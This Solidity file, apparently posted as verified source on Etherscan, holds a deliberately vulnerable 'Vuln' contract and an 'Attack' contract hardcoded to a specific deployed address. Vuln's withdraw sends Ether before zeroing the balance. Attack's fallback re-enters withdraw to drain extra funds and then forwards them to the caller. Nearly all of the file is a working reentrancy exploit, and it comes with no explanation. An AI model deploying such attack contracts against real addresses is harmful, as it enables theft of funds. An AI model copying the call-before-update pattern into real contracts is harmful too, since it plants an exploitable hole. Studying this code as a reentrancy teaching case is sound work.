/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

// File: attack_lakn.sol

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack{
    Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    uint256 public total = 0;
    uint256 public balance = 0;

    fallback() external payable {
        if(total < 2){
            total +=1;
            v.withdraw();
            balance += msg.value;
        }
    }

    function attack() public payable {
        balance += msg.value;
        v.deposit.value(.1 ether)();
        balance -= msg.value;
        v.withdraw();
        total =0;
        msg.sender.transfer(address(this).balance);
    }

    function get_balance() public view returns (uint) {
        return address(this).balance;
    }

}